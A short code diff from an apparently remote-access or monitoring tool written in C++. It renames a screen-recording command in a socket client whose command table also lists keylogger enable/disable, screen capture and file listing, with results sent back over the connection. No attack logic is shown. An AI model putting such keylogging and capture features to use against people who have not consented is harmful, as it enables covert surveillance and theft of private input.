@@ -23,7 +23,7 @@ std::unordered_map<std::string, std::string> ClientSocket::messageMap = {
     {"enableKeyboard", "ENABLE_KEYBOARD"},
     {"enableKeylogger", "ENABLE_KEYLOGGER"},
     {"disableKeylogger", "DISABLE_KEYLOGGER"},
-    {"screenRecording", "SCREEN_RECORDING"}
+    {"recording", "SCREEN_RECORDING"}
 };
 
 std::vector<std::string> ClientSocket::splitArguments(const std::string &str)
@@ -172,7 +172,7 @@ bool ClientSocket::executeCommand(std::string &response, std::string& receivedFi
                 command == "listFiles" ||
                 command == "captureScreen" ||
                 command == "disableKeylogger" ||
-                command == "screenRecording" ) {
+                command == "recording" ) {
         // These command has file send back to client
         // Receive the file name from the server
         memset(buffer, 0, sizeof(buffer));
